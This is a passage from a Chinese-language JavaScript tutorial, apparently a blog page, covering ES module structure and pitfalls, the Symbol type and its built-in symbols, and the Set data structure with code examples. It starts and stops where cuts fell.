id="模块化工程实践"><a href="#模块化工程实践" class="headerlink" title="模块化工程实践"></a>模块化工程实践</h2><p><strong>项目结构示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">src/<br>├── components/     <span class="hljs-comment">// 可复用UI组件</span><br>├── features/       <span class="hljs-comment">// 功能模块</span><br>│   ├── auth/       <span class="hljs-comment">// 认证模块</span><br>│   │   ├── api.<span class="hljs-property">js</span><br>│   │   ├── store.<span class="hljs-property">js</span><br>│   │   └── components/<br>├── lib/            <span class="hljs-comment">// 工具库</span><br>├── services/       <span class="hljs-comment">// API服务层</span><br>└── index.<span class="hljs-property">js</span>        <span class="hljs-comment">// 应用入口</span><br></code></pre></td></tr></table></figure><p><strong>模块设计原则</strong></p><ol><li>单一职责原则：每个模块只解决一个问题</li><li>高内聚低耦合：模块内部紧密相连，模块间依赖最小化</li><li>明确接口：导出必要的变量&#x2F;函数，隐藏内部实现细节</li><li>无副作用导入：避免在导入时执行操作（初始化除外）</li><li>稳定抽象：模块接口应向后兼容</li></ol><p><strong>性能优化策略</strong></p><ol><li>代码分割：路由级&#x2F;组件级动态导入</li><li>共享依赖：避免重复打包（webpack 的 splitChunks）</li><li>Tree shaking：配合 ESM 静态结构实现</li></ol><h2 id="常见问题与解决方案"><a href="#常见问题与解决方案" class="headerlink" title="常见问题与解决方案"></a>常见问题与解决方案</h2><p><strong>循环引用陷阱</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 解决方案：函数导出延迟访问</span><br><span class="hljs-comment">// a.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getA</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> a; &#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> a = <span class="hljs-string">&#x27;A&#x27;</span>;<br><br><span class="hljs-comment">// b.js</span><br><span class="hljs-keyword">import</span> &#123; getA &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./a.js&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getA</span>()); <span class="hljs-comment">// &#x27;A&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>默认导入与命名导入</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 模块定义</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">helper</span> = (<span class="hljs-params"></span>) =&gt; &#123; <span class="hljs-comment">/*...*/</span> &#125;;<br><br><span class="hljs-comment">// 导入方式</span><br><span class="hljs-keyword">import</span> myMain, &#123; helper &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./module.js&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>动态路径问题</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误：无法静态分析</span><br><span class="hljs-keyword">import</span> <span class="hljs-variable language_">module</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;path&#125;</span>/module.js`</span>;<br><br><span class="hljs-comment">// 正确：使用import()函数</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;path&#125;</span>/module.js`</span>);<br></code></pre></td></tr></table></figure><h1 id="ES6-Symbol"><a href="#ES6-Symbol" class="headerlink" title="ES6+ Symbol"></a>ES6+ Symbol</h1><h2 id="定义与描述"><a href="#定义与描述" class="headerlink" title="定义与描述"></a>定义与描述</h2><p>Symbol 是 ES6 新引入的一种原始数据类型，表示独一无二的值，Symbol 的主要用途是创建唯一标识符，用于对象属性的键，以避免属性名冲突。</p><h2 id="创建与使用"><a href="#创建与使用" class="headerlink" title="创建与使用"></a>创建与使用</h2><p><strong>基础创建</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 无描述创建</span><br><span class="hljs-keyword">const</span> sym1 = <span class="hljs-title class_">Symbol</span>();<br><br><span class="hljs-comment">// 带描述创建（仅用于调试）</span><br><span class="hljs-keyword">const</span> sym2 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;description&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sym2.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// &quot;Symbol(description)&quot;</span><br></code></pre></td></tr></table></figure><p><strong>全局注册表</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建或获取全局 Symbol</span><br><span class="hljs-keyword">const</span> globalSym = <span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;global_key&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">keyFor</span>(globalSym)); <span class="hljs-comment">// &quot;global_key&quot;</span><br><br><span class="hljs-comment">// 跨模块访问</span><br><span class="hljs-comment">// module1.js</span><br><span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;shared&#x27;</span>);<br><br><span class="hljs-comment">// module2.js</span><br><span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;shared&#x27;</span>) === <span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;shared&#x27;</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="核心特性"><a href="#核心特性" class="headerlink" title="核心特性"></a>核心特性</h2><p><strong>唯一性</strong></p><p>每个 Symbol 的值都是唯一的，即使它们有相同的描述</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> s1 = <span class="hljs-title class_">Symbol</span>();<br><span class="hljs-keyword">const</span> s2 = <span class="hljs-title class_">Symbol</span>();<br>s1 === s2 <span class="hljs-comment">// false</span><br><br><span class="hljs-keyword">const</span> s3 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;desc&#x27;</span>);<br><span class="hljs-keyword">const</span> s4 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;desc&#x27;</span>);<br>s3 === s4 <span class="hljs-comment">// false（即使描述相同）</span><br></code></pre></td></tr></table></figure><p><strong>值不可修改</strong></p><p>Symbol 值一旦创建不可被修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> sym = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;unique&#x27;</span>);<br><span class="hljs-comment">// 没有任何方法可以改变 sym 的值</span><br>sym.<span class="hljs-property">description</span> = <span class="hljs-string">&#x27;changed&#x27;</span>; <span class="hljs-comment">// 静默失败（非严格模式）</span><br></code></pre></td></tr></table></figure><p><strong>不可枚举性</strong></p><p>当使用 Symbol 值作为对象属性键时，默认情况下常规方法（如 <code>for...in</code>，<code>Object.keys()</code>）中不可见，但可以通过 <code>Object.getOwnPropertySymbols()</code> 和 <code>Reflect.ownKeys()</code> 获取</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;key&#x27;</span>)]: <span class="hljs-string">&#x27;value&#x27;</span>,<br>  <span class="hljs-attr">normalKey</span>: <span class="hljs-string">&#x27;normal&#x27;</span><br>&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// 只输出 &quot;normalKey&quot;</span><br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj)); <span class="hljs-comment">// [&quot;normalKey&quot;]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj)); <span class="hljs-comment">// &#123;&quot;normalKey&quot;:&quot;normal&quot;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>特殊运算</strong></p><p>Symbol 类型的值不能与其他类型的值进行运算，会报错，但 Symbol 值可以转为字符串和布尔值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> s = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)<br>s + <span class="hljs-string">&#x27;world&#x27;</span> <span class="hljs-comment">// TypeError: can&#x27;t convert a Symbol value to a string</span><br><span class="hljs-string">`<span class="hljs-subst">$&#123;s&#125;</span> world`</span> <span class="hljs-comment">// TypeError: can&#x27;t convert a Symbol value to a string</span><br><span class="hljs-title class_">Number</span>(s) <span class="hljs-comment">// TypeError: Cannot convert a Symbol value to a number</span><br>s + <span class="hljs-number">2</span> <span class="hljs-comment">// TypeError: Cannot convert a Symbol value to a number</span><br></code></pre></td></tr></table></figure><h2 id="内置的-Symbol-值"><a href="#内置的-Symbol-值" class="headerlink" title="内置的 Symbol 值"></a>内置的 Symbol 值</h2><p>JavaScript 内置的 Symbol 属性可以用于修改语言的内部行为</p><p><strong>Symbol.hasInstance - 自定义 instanceof 行为</strong></p><p>对象的 Symbol.hasInstance 属性指向一个内部方法，当其他对象使用 instanceof 运算符判断是否为该对象的实例时，就会调用这个内部方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObj</span> &#123;<br>  <span class="hljs-keyword">static</span> [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">hasInstance</span>](obj) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj) === <span class="hljs-string">&#x27;[object Number]&#x27;</span><br>  &#125;<br>&#125;<br><br><span class="hljs-number">1</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyObj</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;<br>obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyObj</span> <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Symbol.iterator - 定义对象的默认迭代器</strong></p><p>对象的 Symbol.iterator 属性指向该对象的默认遍历器方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">[...&#123; [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>]: <span class="hljs-keyword">function</span>*() &#123; <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>; <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span>; &#125; &#125;] <span class="hljs-comment">// [1, 2]</span><br></code></pre></td></tr></table></figure><p><strong>Symbol.toStringTag - 定制 Object.prototype.toString</strong></p><p>对象的 Symbol.toStringTag 属性用来设定一个字符串，当其他对象调用 Object.prototype.toString 判断类型时，如果 Symbol.toStringTag 属性存在，则该属性设定的字符串会出现在 toString 方法返回的字符串中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomClass</span> &#123;<br>  get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Custom&#x27;</span><br>  &#125;<br>&#125;<br><span class="hljs-keyword">let</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomClass</span>()<br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj) <span class="hljs-comment">// [object Custom]</span><br><br>(&#123; [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]: <span class="hljs-string">&#x27;Custom&#x27;</span> &#125;).<span class="hljs-title function_">toString</span>() <span class="hljs-comment">// [object Custom]</span><br></code></pre></td></tr></table></figure><p><strong>Symbol.species - 指定衍生对象的构造函数</strong></p><p>对象的 Symbol.species 属性指向一个构造函数，当创建衍生对象时，会使用该属性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Array</span> &#123;<br>  <span class="hljs-keyword">static</span> get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">species</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyArray</span>();<br><span class="hljs-keyword">const</span> b = a.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x);<br><br>b <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyArray</span> <span class="hljs-comment">// false</span><br>b <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span> <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>由于创建 MyArray 时使用了 Symbol.species 属性，因此会使用 Symbol.species 返回的函数作为构造函数，衍生对象 b 就不是 MyArray 的实例</p><p><strong>Symbol.match - 定制字符串匹配行为</strong></p><p>对象的 Symbol.match 属性指向一个函数，当执行 str.match(MyObj)，如果 MyObj 存在该属性，会调用该属性指向的函数，并将函数的返回值作为 str.match(MyObj) 的返回值</p><p>默认行为中，regex[Symbol.match] 指向 RegExp 内置的匹配方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/foo/</span>;<br><span class="hljs-string">&#x27;foobar&#x27;</span>.<span class="hljs-title function_">match</span>(regex); <span class="hljs-comment">// [&quot;foo&quot;, index: 0, input: &quot;foobar&quot;]</span><br></code></pre></td></tr></table></figure><p>通过 Symbol.match 属性可以让任何对象成为合法的 match 参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> customMatcher = &#123;<br>  [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">match</span>](str) &#123;<br>    <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;hello&#x27;</span>) ? <br>      [<span class="hljs-string">&#x27;匹配成功&#x27;</span>] : <br>      <span class="hljs-literal">null</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-string">&#x27;world hello&#x27;</span>.<span class="hljs-title function_">match</span>(customMatcher); <span class="hljs-comment">// [&quot;匹配成功&quot;]</span><br><span class="hljs-string">&#x27;no match&#x27;</span>.<span class="hljs-title function_">match</span>(customMatcher);    <span class="hljs-comment">// null</span><br></code></pre></td></tr></table></figure><p>此外，还有 Symbol.replace、Symbol.search、Symbol.split 等属性，都是用于定制 String 对应的方法</p><h2 id="Symbol-与相关技术对比"><a href="#Symbol-与相关技术对比" class="headerlink" title="Symbol 与相关技术对比"></a>Symbol 与相关技术对比</h2><table><thead><tr><th align="left">特性</th><th align="left">Symbol</th><th align="left">字符串属性</th><th align="left">WeakMap</th></tr></thead><tbody><tr><td align="left">唯一性</td><td align="left">唯一</td><td align="left">不唯一</td><td align="left">唯一（键为对象）</td></tr><tr><td align="left">可枚举性</td><td align="left">不可枚举（默认）</td><td align="left">可枚举</td><td align="left">N&#x2F;A</td></tr><tr><td align="left">内存管理</td><td align="left">全局注册 Symbol 需手动管理</td><td align="left">自动回收</td><td align="left">可被 GC 垃圾回收</td></tr><tr><td align="left">私有性</td><td align="left">弱私有（反射可获取）</td><td align="left">完全公开</td><td align="left">强私有</td></tr><tr><td align="left">适用场景</td><td align="left">协议实现&#x2F;防冲突</td><td align="left">常规数据存储</td><td align="left">真正私有数据存储</td></tr></tbody></table><h2 id="Symbol-的核心价值"><a href="#Symbol-的核心价值" class="headerlink" title="Symbol 的核心价值"></a>Symbol 的核心价值</h2><ul><li>提供真正唯一的标识符，解决命名冲突问题</li><li>实现 JavaScript 内置协议（如迭代协议）</li><li>支持元编程，改变语言内部行为</li><li>为对象提供弱封装能力（非完全私有）</li></ul><h1 id="ES6-Set-和-Map-结构"><a href="#ES6-Set-和-Map-结构" class="headerlink" title="ES6+ Set 和 Map 结构"></a>ES6+ Set 和 Map 结构</h1><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><h3 id="Set-的定义和基本用法"><a href="#Set-的定义和基本用法" class="headerlink" title="Set 的定义和基本用法"></a>Set 的定义和基本用法</h3><p>Set 是 ES6 引入的新的数据结构，是一种集合类型，类似于数组，但成员的值是唯一的，没有重复成员。Set 本身是一个构造函数，用于生成 Set 数据结构。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()<br></code></pre></td></tr></table></figure><p>Set()函数可以接受一个数组（或者具有 iterable 接口的其他数据结构）作为参数，用来初始化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>])<br></code></pre></td></tr></table></figure><h3 id="Set-的核心特性"><a href="#Set-的核心特性" class="headerlink" title="Set 的核心特性"></a>Set 的核心特性</h3><p><strong>唯一性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-property">size</span>); <span class="hljs-comment">// 2 (1 和 &#x27;1&#x27; 是不同的值)</span><br></code></pre></td></tr></table></figure><p>唯一性判断采用 <code>SameValueZero</code> 算法：</p><ul><li>NaN 被视为相等</li><li>+0 和 -0 被视为相等</li><li>对象引用比较（不同对象即使内容相同也被视为不同）</li></ul><p>根据该特性可以实现数组去重：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 去除数组的重复成员</span><br>[...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(array)]<br></code></pre></td></tr></table></figure><p><strong>值类型支持</strong></p><p>Set 数据结构可以存储任意类型的值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<br>  <span class="hljs-number">1</span>, <br>  <span class="hljs-string">&#x27;text&#x27;</span>,<br>  &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;obj&#x27;</span>&#125;,<br>  [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>],<br>  <span class="hljs-title class_">NaN</span>,<br>  <span class="hljs-literal">undefined</span>,<br>  <span class="hljs-literal">null</span><br>]);<br></code></pre></td></tr></table></figure><h3 id="Set-的基础-API-详解"><a href="#Set-的基础-API-详解" class="headerlink" title="Set 的基础 API 详解"></a>Set 的基础 API 详解</h3><table><thead><tr><th align="left">方法&#x2F;属性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">new Set(iterable)</td><td align="left">构造函数</td></tr><tr><td align="left">set.has(value)</td><td align="left">检查值是否存在</td></tr><tr><td align="left">set.add(value)</td><td align="left">添加值</td></tr><tr><td align="left">set.delete(value)</td><td align="left">删除值</td></tr><tr><td align="left">set.clear(value)</td><td align="left">清空集合</td></tr><tr><td align="left">set.size</td><td align="left">获取 Set 实例的成员数量（非函数属性，不能 set.size()）</td></tr></tbody></table><h3 id="Set-的迭代操作"><a href="#Set-的迭代操作" class="headerlink" title="Set 的迭代操作"></a>Set 的迭代操作</h3><p>Set 结构的实例有四个迭代方法，用于遍历成员：</p><ul><li>set.values()：返回键值的遍历器</li><li>set.keys()：返回键名的遍历器</li><li>set.entries()：返回键值对的遍历器</li><li>set.forEach()：使用回调函数变量成员</li></ul><p>Set 实例的遍历顺序就是成员插入的顺序，该特性可以用于保证回调函数列表的执行顺序。Set 结构实例的默认遍历器生成函数就是它的 values()方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>]);<br><br><span class="hljs-comment">// 1. for...of</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> set) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(item);<br>&#125;<br><br><span class="hljs-comment">// 2. forEach</span><br>set.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, valueAgain</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value); <span class="hljs-comment">// 注意：两个参数相同</span><br>&#125;);<br><br><span class="hljs-comment">// 3. 获取迭代器</span><br><span class="hljs-keyword">const</span> iterator = set.<span class="hljs-title function_">values</span>(); <span class="hljs-comment">// 或 set[Symbol.iterator]()</span><br></code></pre></td></tr></table></figure><h3 id="Set-的高级特性与应用"><a href="#Set-的高级特性与应用" class="headerlink" title="Set 的高级特性与应用"></a>Set 的高级特性与应用</h3><p><strong>性能优势</strong></p><p>Set 的查找性能远优于数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 数组 vs Set 查找性能对比</span><br><span class="hljs-keyword">const</span> arr = [<span class="hljs-comment">/* 10,000 个元素 */</span>];<br><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(arr);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Array&#x27;</span>);<br>arr.<span class="hljs-title function_">includes</span>(<span class="hljs-number">9999</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Array&#x27;</span>); <span class="hljs-comment">// ~0.1ms</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Set&#x27;</span>);<br>set.<span class="hljs-title function_">has</span>(<span class="hljs-number">9999</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Set&#x27;</span>); <span class="hljs-comment">// ~0.005ms</span><br></code></pre></td></tr></table></figure><p><strong>集合运算实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 并集</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">union</span>(<span class="hljs-params">setA, setB</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([...setA, ...setB]);<br>&#125;<br><br><span class="hljs-comment">// 交集</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">intersection</span>(<span class="hljs-params">setA, setB</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([...setA].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> setB.<span class="hljs-title function_">has</span>(x)));<br>&#125;<br><br><span class="hljs-comment">// 差集</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">difference</span>(<span class="hljs-params">setA, setB</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([...setA].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> !setB.<span class="hljs-title 